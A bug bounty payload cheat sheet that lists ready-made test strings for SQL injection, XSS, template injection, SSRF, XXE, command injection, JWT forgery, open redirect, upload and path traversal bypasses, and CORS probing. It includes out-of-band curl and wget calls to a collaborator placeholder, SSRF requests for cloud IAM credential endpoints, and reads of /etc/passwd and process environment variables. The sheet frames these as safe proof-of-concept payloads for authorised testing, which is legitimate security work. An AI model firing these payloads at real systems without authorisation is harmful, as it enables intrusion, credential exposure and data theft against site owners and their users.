# Bug Bounty Safe Payloads Reference

All payloads here are designed to **prove** a vulnerability exists without causing damage.

---

## SQL Injection

### Detection
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
" OR "1"="1
' AND '1'='2
1' ORDER BY 1--
1' ORDER BY 10--
```

### Error-Based (MySQL)
```
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
```

### Error-Based (PostgreSQL)
```
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=1/(SELECT 0 FROM pg_sleep(0))--
```

### Error-Based (MSSQL)
```
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=1; WAITFOR DELAY '0:0:5'--
```

### Blind — Time-Based
```
' AND SLEEP(5)--                          # MySQL
' AND pg_sleep(5)--                       # PostgreSQL
'; WAITFOR DELAY '0:0:5'--               # MSSQL
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### Blind — Boolean
```
' AND 1=1--    (true condition)
' AND 1=2--    (false condition)
' AND SUBSTRING(@@version,1,1)='5'--
```

### UNION-Based (safe — null columns)
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,version(),3--
```

### Safe data to extract for PoC
- `version()` / `@@version` — database version
- `current_user()` / `user()` — current DB user
- `database()` / `current_database()` — current database name
- Table/column names from information_schema

### NEVER extract
- User passwords or hashes
- PII (emails, addresses, phone numbers)
- Payment information
- API keys or tokens belonging to other users

---

## Cross-Site Scripting (XSS)

### Basic Detection
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(document.domain)</script>
'><script>alert(document.domain)</script>
javascript:alert(document.domain)
```

### Filter Bypass
```html
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
<IMG SRC=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

### DOM-Based Detection
```javascript
// Check for reflection in:
location.hash
location.search
document.referrer
document.URL
window.name
postMessage handlers
```

### Polyglots
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(document.domain) )//%0telerik%0A%0a<telerik>%253telerik%253e-->*/alert(document.domain)/*
```

### Safe PoC Payloads (prove impact without harm)
```html
<!-- Prove XSS fires -->
<script>alert(document.domain)</script>

<!-- Prove cookie access (show, don't steal) -->
<script>alert(document.cookie)</script>

<!-- Screenshot-friendly -->
<img src=x onerror="document.body.innerHTML='<h1>XSS by [YourHandle]</h1>'">
```

### NEVER do
- Redirect to external phishing pages
- Steal other users' sessions
- Inject cryptocurrency miners
- Modify other users' data

---

## Server-Side Template Injection (SSTI)

### Detection (try all — identifies engine)
```
{{7*7}}                 → 49 = Jinja2, Twig, Nunjucks
${7*7}                  → 49 = FreeMarker, Mako, Velocity
<%= 7*7 %>              → 49 = ERB (Ruby), EJS
#{7*7}                  → 49 = Pug/Jade, Thymeleaf
{{7*'7'}}               → 7777777 = Jinja2 specifically
{{config}}              → Jinja2 config dump
${T(java.lang.Runtime)} → Java/Spring
```

### Safe PoC — Jinja2
```
{{config.items()}}
{{request.environ}}
```

### Safe PoC — Freemarker
```
${.version}
${"freemarker.template.utility.Execute"?new()("id")}
```

### Safe RCE proof (if SSTI → RCE)
```
# Show command execution is possible with safe commands only:
id
whoami
hostname
cat /etc/hostname
uname -a
```

---

## Server-Side Request Forgery (SSRF)

### Basic Detection
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://127.1
http://2130706433        # decimal IP for 127.0.0.1
http://0x7f000001        # hex IP for 127.0.0.1
```

### Cloud Metadata Endpoints (safe to prove SSRF)
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
# (requires header: Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# (requires header: Metadata: true)

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Internal Port Scanning via SSRF
```
http://127.0.0.1:22      # SSH
http://127.0.0.1:3306    # MySQL
http://127.0.0.1:6379    # Redis
http://127.0.0.1:9200    # Elasticsearch
http://127.0.0.1:8080    # Internal web
```

### Filter Bypass
```
http://0177.0.0.1        # Octal
http://127.0.0.1.nip.io  # DNS rebinding
http://spoofed.burpcollaborator.net  # DNS-based detection
http://127.0.0.1%2523@evil.com       # URL parser confusion
```

### NEVER do with SSRF
- Attack internal services
- Modify internal data
- Access other tenants' resources
- Use SSRF to pivot deeper into the network

---

## Insecure Direct Object Reference (IDOR)

### Common Parameters to Test
```
user_id, id, uid, account_id
order_id, invoice_id, receipt_id
file_id, doc_id, document_id
project_id, org_id, team_id
```

### Testing Method
```
1. Create Account A and Account B (YOUR test accounts)
2. Perform action as Account A → note the object ID
3. Try to access that object ID as Account B
4. If successful → IDOR confirmed
```

### Common Locations
```
GET /api/users/{id}/profile
GET /api/orders/{id}
GET /api/files/{id}/download
POST /api/messages/{id}
DELETE /api/comments/{id}
PUT /api/users/{id}/settings
```

### Bypass Techniques
```
# If numeric ID is blocked, try:
- UUID enumeration (if predictable)
- Encoded IDs (base64 decode → modify → re-encode)
- Hash-based IDs (try sequential hashing)
- GraphQL introspection for ID fields
- Changing HTTP method (GET→POST, POST→PUT)
- Adding wrapping: {"id": [123]} instead of {"id": 123}
```

---

## XXE (XML External Entity)

### Basic Detection
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

### Safe File Read for PoC
```xml
<!ENTITY xxe SYSTEM "file:///etc/hostname">
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

### Blind XXE (out-of-band)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-URL/xxe">
  %xxe;
]>
```

### NEVER read via XXE
- `/etc/shadow`
- Private keys
- Application secrets/configs with real credentials
- Other users' files

---

## Command Injection

### Detection
```
; id
| id
`id`
$(id)
%0a id
& id
&& id
|| id
```

### Blind Detection (time-based)
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1 &
```

### Blind Detection (out-of-band)
```
; curl http://YOUR-COLLABORATOR-URL/cmd
| wget http://YOUR-COLLABORATOR-URL/cmd
; nslookup YOUR-COLLABORATOR-URL
```

### Safe Commands for PoC
```
id
whoami
hostname
uname -a
cat /etc/hostname
```

### NEVER execute
- Reverse shells
- File modification
- User data access
- Service disruption commands

---

## JWT Attacks

### None Algorithm
```python
import jwt
token = jwt.encode({"sub": "admin"}, key="", algorithm="none")
```

### Weak Secret (test with known weak keys)
```bash
# Check for common weak secrets
echo -n "secret" | jwt_tool <token> -C -d /usr/share/wordlists/jwt-secrets.txt
```

### Algorithm Confusion (RS256 → HS256)
```python
# If you can get the public key, try signing with it as HS256 secret
import jwt
public_key = open("public.pem").read()
token = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")
```

### kid Injection
```json
{
  "kid": "../../../../../../dev/null",
  "alg": "HS256"
}
# Sign with empty string as key
```

---

## Open Redirect

### Basic
```
https://target.com/redirect?url=https://evil.com
https://target.com/redirect?url=//evil.com
https://target.com/redirect?url=/\evil.com
https://target.com/redirect?url=https://target.com@evil.com
https://target.com/redirect?url=https://evil.com%23.target.com
```

### Common Parameters
```
url, redirect, redirect_uri, return, return_url, next, next_url
rurl, dest, destination, redir, redirect_url, callback, path, forward
```

---

## File Upload

### Extension Bypass
```
.php → .php5, .php7, .phtml, .phar, .phps
.asp → .aspx, .ashx, .asmx
.jsp → .jspx, .jsw, .jsv
.php → .php.jpg, .php%00.jpg (null byte)
.php → .pHp, .PHP (case variation)
```

### Content-Type Bypass
```
Change Content-Type: application/x-php
    to Content-Type: image/jpeg
```

### Safe Upload PoC
- Upload a text file with a dangerous extension (`.php`)
- Content: `<?php echo "PoC - file upload"; ?>` (benign)
- Prove it executes — screenshot the output
- NEVER upload actual webshells

---

## Path Traversal / LFI

### Basic
```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
```

### Safe Files to Read for PoC
```
/etc/passwd          # Public, proves read access
/etc/hostname        # Machine name
/proc/version        # Kernel version
/proc/self/environ   # Environment variables (may contain secrets — redact in report)
```

### NEVER read
```
/etc/shadow
/root/.ssh/id_rsa
Application database files
Other users' home directories
```

---

## CORS Misconfiguration

### Detection
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user
# Check for:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
```

### Null Origin
```bash
curl -H "Origin: null" -I https://target.com/api/user
```

### Subdomain Wildcard
```bash
curl -H "Origin: https://attacker.target.com" -I https://target.com/api/user
```
